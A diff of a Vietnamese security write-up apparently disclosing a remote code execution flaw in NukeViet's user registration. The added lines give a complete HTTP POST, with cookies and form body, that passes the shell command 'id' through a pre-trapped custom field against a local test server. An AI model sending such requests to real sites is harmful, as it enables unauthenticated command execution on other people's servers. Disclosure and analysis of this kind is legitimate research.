@@ -222,10 +222,19 @@ Nếu field cũ vốn là kiểu "lựa chọn" (dropdown/checkbox), code sẽ �
 Bất kỳ ai — kể cả người dùng chưa có tài khoản — gửi request đăng ký với field vừa bị gài bẫy:
 
 ```
-POST /index.php?nv=users&op=register
-...
-custom_fields[nv_poc_rce]=id
+POST /index.php/en/users/register/ HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Length: 300
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://127.0.0.1:8080
+Referer: http://127.0.0.1:8080/index.php/en/users/register/
+Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq; nv4_ctr=MTI3XzBfMF8xLlpa; nv4_cltz=420.420.420%257C%252F%257C; nv4_int_lang=pOxnN8G_Y2oE8WkMeO5ZaA%2C%2C; nv4_data_lang=nm4mM0iUHCjIeKvQXUH07A%2C%2C; nv4_statistic_vi=UBvGwCykzSgyccgMyKVTdg%2C%2C; nv4_nvvithemever=uT11mKuPK7N0yvymMZ3phA%2C%2C; nv4_cltn=QXNpYS9CYW5na29rLjI1MjAwLjA%3D; nv4_sess=3a7c37e4920abcaeab8448f88be01f15; nv4_u_lang=pOxnN8G_Y2oE8WkMeO5ZaA%2C%2C; nv4_statistic_en=k3GL5m1flaMTyFg0Z2rVSQ%2C%2C; nv4_nventhemever=uT11mKuPK7N0yvymMZ3phA%2C%2C
+Connection: keep-alive
+
+first_name=tesst&last_name=test&username=test01&email=hust1212%40gmail.com&password=Password123%40!&re_password=Password123%40!&gender=M&birthday=23%2F08%2F1985&sig=test&question=test&answer=test&custom_fields%5Bnv_poc_rce%5D=id&agreecheck=1&nv_seccode=2DC76F&checkss=b381411c8c8e6f6ccc860e3bbdf50517
 ```
+
+![](/blog/assets/rce.png)
 
 Server thực thi:
 
